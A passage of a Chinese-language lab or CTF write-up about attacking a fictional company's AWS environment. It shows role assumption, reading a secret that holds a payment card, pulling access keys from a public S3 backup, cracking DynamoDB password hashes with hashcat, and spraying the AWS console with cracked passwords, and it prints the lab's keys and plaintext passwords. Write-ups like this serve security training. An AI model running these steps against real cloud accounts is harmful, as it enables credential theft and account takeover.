        "IsDefaultVersion": true,
        "CreateDate": "2023-08-04T22:34:19+00:00"
    }
}

#即可得到临时的aksk和token
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name feng  --external-id 37911 --no-cli-pager
```

重新配置aws后，得到secret的value：

```plain
aws secretsmanager list-secrets --no-cli-pager
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-13T02:15:38.909000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-13T02:14:35.740000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2023-10-16T15:18:02.417000+08:00",
            "LastChangedDate": "2023-10-16T15:18:02.369000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "NextRotationDate": "2023-10-24T07:59:59+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "2bb80579-4b3e-4319-8d74-3bca18a404a5": [
                    "AWSPREVIOUS"
                ],
                "388b154d-87b8-4c69-901b-9902484d22da": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ]
            },
            "CreatedDate": "2023-07-13T02:15:02.970000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T04:10:16.392000+08:00",
            "LastAccessedDate": "2023-10-21T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T05:19:28.466000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T06:33:39.872000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T06:33:39.828000+08:00"
        }
    ]
}


aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK --no-cli-pager
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"68131559a7cee3e547d69046fdf425ca\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T06:33:39.867000+08:00"
}
```

从中得到了flag，现实意义就是可以随意得到目标公司的billing信息。

## 9.Execute and Identify Credential Abuse in AWS

存储工可以公开访问，下载下来里面的json文件

```plain
aws s3 cp s3://hl-storage-general/migration/asana-cloud-migration-backup.json ./ --no-sign-request

      "liked" : false,
      "likes" : [ ],
      "memberships" : [ ],
      "modified_at" : "2023-08-09T19:42:50.647Z",
      "name" : "Test automation account",
      "notes" : "Access key ID,\nAKIATRPHKUQK4TXINWX4\n\nSecret access key\n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",
      "num_hearts" : 0,
      "num_likes" : 0,
```

在json文件里面搜索AK，找到了一个aksk。

配置好之后进行简单的iam权限检查：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATRPHKUQK2AQGRYR46",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/migration-test"
}


aws dynamodb list-tables --no-cli-pager
{
    "TableNames": [
        "analytics_app_users",
        "user_order_logs"
    ]
}

aws dynamodb describe-endpoints --no-cli-pager
{
    "Endpoints": [
        {
            "Address": "dynamodb.us-east-1.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}


aws dynamodb describe-table --table-name analytics_app_users --no-cli-pager
{
    "Table": {
        "AttributeDefinitions": [
            {
                "AttributeName": "UserID",
                "AttributeType": "S"
            }
        ],
        "TableName": "analytics_app_users",
        "KeySchema": [
            {
                "AttributeName": "UserID",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2023-08-10T04:23:16.704000+08:00",
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 0,
            "WriteCapacityUnits": 0
        },
        "TableSizeBytes": 7734,
        "ItemCount": 51,
        "TableArn": "arn:aws:dynamodb:us-east-1:243687662613:table/analytics_app_users",
        "TableId": "6568c0bb-bdf7-4380-877c-05b7826505ad",
        "BillingModeSummary": {
            "BillingMode": "PAY_PER_REQUEST",
            "LastUpdateToPayPerRequestDateTime": "2023-08-10T04:23:16.704000+08:00"
        },
        "TableClassSummary": {
            "TableClass": "STANDARD"
        },
        "DeletionProtectionEnabled": true
    }
}

aws dynamodb describe-table --table-name user_order_logs --no-cli-pager

An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized to perform: dynamodb:DescribeTable on resource: arn:aws:dynamodb:us-east-1:243687662613:table/user_order_logs because no identity-based policy allows the dynamodb:DescribeTable action


aws dynamodb scan --table-name analytics_app_users > output.json
```

表中存储了许多的用户名和密码hash，拿python处理一下：

```plain
import json

up = []
with open("1.json") as f:
    js = json.load(f)
    items = js['Items']
    for item in items:
        #print((item))
        up.append(item['UserID']['S']+":"+item['PasswordHash']['S'])

print(up)
with open("hash.txt",'w') as f:
    for i in up:
        f.write(i+"\n")
```

拿hashcat爆破：

```plain
hashcat -m 1400 hash.txt /Users/feng/many-ctf/rockyou.txt --force --username

hashcat --show -m 1400  hash.txt --username
nwaverly:16e5730f247e371987dcf1f14ad963927b72ae37575a98e575f6134395769866:southbeach123
pmuamba:60d4e076c6339c81c8bdc4105ce52eeb4a186766ab42cc6f1e8b098cec3a9680:Tr@vis83
pkaur:c8e935a90248e1c2cfb2241b87e73780688301378aff3e672feb14b743b3150a:soccer!1
isilva:18efddc796c1307547e216cafadda4eee4cd7173d7f6db0430af5f14dd796fe6:freightliner01
rthomas:51c1ac4067ca6f2a531754a2396c3b5fd088f5312c274c12d7d2afe3b3f75452:Sparkery2*
sgarcia:39b81a17a1cef9d74897107a67421de06f4630e146c043b5dee333bf7e556c6a:travelling08
rstead:09d723dcba27c57054faa197e630226df6a40eb322bf565ff532b74bf81e2952:Abc123!!
jyoshida:19924b2d08e2816a18b865a38b9b19fba587756cf652f9943fe07f7a7cb477cf:1logistics
aramirez:223488c373a609fa579a603a61b81c7a0db798e49e0eba004c282ea77c416dc9:airfreight
adell:95825fc3bb5e0696c23215b2c5b1070708c072c7b3bdb1956e850640b4f4f25e:01summertime
nliu:008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601:Password123
vkawasaki:2c8c9030223e3192e96d960f19b0ecf9a9ba93175565cb987b28ec69b027ae86:Summer01
cchen:05aa6659dbc4d45231c447b876866c889f9ebc7863ccecc79e38b049a204e4a0:analytical
gpetersen:10dcca6ba3c4c763b5624ff94964dfd772c7447ac3fdce43a5775cefe1bfc6b7:R0ckY0u!
odas:03a311656c69e0c01aa7783aafc272601311d5fafa4c053ad5c3d17de44badcd:logistic
cjoyce:1ef68f8443b4dd8f9d0eb156d56eb31e2554db937f7a38ba73341ba342b7d8b9:shipping2
fwallman:88e7a770752bf253b970c0028d269b99470104760b39a59ccee336f5cbe40d7e:Wilco6!!!
bjohnson:835b9bc47736fcd5d2e8f521bcb01c9106f2095335dbdb803b2d1b248fb20a86:montecarlo98
```

依次放入user.txt和pass.txt，进行aws控制台的喷洒攻击：

```plain
./GoAWSConsoleSpray -a 243687662613 -u user.txt -p pass.txt
2023/10/22 13:50:40 GoAWSConsoleSpray: [18] users loaded. [18] passwords loaded. [324] potential login requests.
2023/10/22 13:50:40 Spraying User: arn:aws:iam::243687662613:user/nwaverly
2023/10/22 13:50:55 Spraying User: arn:aws:iam::243687662613:user/pmuamba
2023/10/22 13:51:09 Spraying User: arn:aws:iam::243687662613:user/pkaur
2023/10/22 13:51:24 Spraying User: arn:aws:iam::243687662613:user/isilva
2023/10/22 13:51:38 Spraying User: arn:aws:iam::243687662613:user/rthomas
2023/10/22 13:51:53 Spraying User: arn:aws:iam::243687662613:user/sgarcia
2023/10/22 13:52:07 Spraying User: arn:aws:iam::243687662613:user/rstead
2023/10/22 13:52:13 (rstead)    [+] SUCCESS:    Valid Password: Abc123!!    MFA: false
```

MFA是多重身份验证，指要求用户输入更多信息，而不仅仅是输入密码。例如，除了密码之外，用户可能需要输入发送到其电子邮件的代码，回答一个秘密问题，或者扫描指纹。如果系统密码遭到泄露，第二种形式的身份验证有助于防止未经授权的账户访问。

登录成功后进入DynamoDB，user\_order\_logs表可以查看，里面有一列是flag：

[![](assets/1701606685-bdc4ffb6e3f6075975cea1a6fb969aa5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109140318-ae1e5d2e-7ec5-1.png)
